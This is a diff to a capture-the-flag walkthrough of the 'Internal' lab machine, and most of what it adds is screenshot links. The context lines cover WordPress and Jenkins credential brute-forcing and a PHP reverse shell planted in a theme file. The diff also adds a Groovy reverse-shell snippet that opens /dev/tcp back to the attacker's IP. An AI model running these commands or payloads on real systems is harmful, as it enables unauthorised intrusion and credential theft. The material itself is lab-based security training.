@@ -42,11 +42,15 @@ Next, perform directory enumeration:
 feroxbuster -u http://internal.thm/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 ```
 
+![image](images/interna6.png)
+
 ### Interesting Discovery
 
 ```text
 http://internal.thm/blog
 ```
+
+![image](images/interna7.png)
 
 The enumeration results suggest that the target is hosting a WordPress installation.
 
@@ -66,6 +70,8 @@ After the scan completes, we discover a valid WordPress user:
 admin
 ```
 
+![image](images/interna8.png)
+
 Now that we have a username, we can attempt to recover the password.
 
 <h3>Brute Forcing WordPress Credentials</h3>
@@ -77,6 +83,8 @@ wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.t
 ```
 
 After a short period, WPScan successfully discovers the password for the admin account.
+
+![image](images/interna9.png)
 
 Using the recovered credentials, we log into the WordPress administration panel.
 
@@ -104,6 +112,8 @@ nc -lvnp 4444
 
 Replace the contents of `404.php` with a PHP reverse shell and save the changes.
 
+![image](images/interna10.png)
+
 The modified file can then be accessed at:
 
 ```text
@@ -111,6 +121,8 @@ http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
 ```
 
 As soon as the page loads, a reverse shell is received.
+
+![image](images/interna11.png)
 
 <h3>Post Exploitation Enumeration</h3>
 
@@ -142,6 +154,8 @@ find / -name "*.txt" -readable -type f 2>/dev/null
 
 Inside the file we discover credentials belonging to the user `aubreanna`.
 
+![image](images/interna12.png)
+
 Additional locations worth checking include:
 
 ```bash
@@ -164,6 +178,8 @@ Using the credentials recovered from `wp-save.txt`, connect via SSH:
 ssh aubreanna@internal.thm
 ```
 
+![image](images/interna13.png)
+
 After logging in, we discover a note mentioning an internal Jenkins instance:
 
 ```text
@@ -185,6 +201,7 @@ The Jenkins portal can now be accessed locally:
 ```text
 http://localhost:6767
 ```
+![image](images/interna14.png)
 
 Opening the page presents a Jenkins login screen.
 
@@ -207,6 +224,8 @@ hydra -s 6767 127.0.0.1 -f http-form-post "/j_acegi_security_check:j_username=^U
 
 Eventually Hydra discovers the correct password.
 
+![image](images/interna15.png)
+
 Using the recovered credentials, we successfully authenticate to Jenkins.
 
 <h3>Jenkins Remote Code Execution</h3>
@@ -225,9 +244,18 @@ Start a listener:
 nc -lvnp 8443
 ```
 
+```bash
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<your-ip>/8443;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+![image](images/interna16.png)
+
 Execute a Groovy reverse shell through the console.
 
 Once the script runs, a reverse shell is received.
+
+![image](images/interna17.png)
 
 We now have access as the:
 
@@ -270,5 +298,6 @@ With root privileges obtained, retrieve the final flag:
 ```bash
 cat /root/root.txt
 ```
+![image](images/interna19.png)
 
 ### Flag Captured
